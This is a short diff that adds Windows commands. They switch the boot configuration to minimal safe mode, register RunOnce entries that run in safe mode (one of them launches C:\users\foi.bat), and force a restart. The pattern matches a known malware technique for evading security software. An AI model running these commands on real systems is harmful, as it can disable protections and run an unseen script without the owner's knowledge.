@@ -1,0 +1,4 @@
+C:\Windows\Sysnative\bcdedit /set {current} safeboot minimal
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "*UndoSB" /t REG_SZ /d "C:\Windows\Sysnative\bcdedit /deletevalue {current} safeboot"
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v "*!chama" /t REG_SZ /d "C:\users\foi.bat"
+SHUTDOWN -r -f -t 10
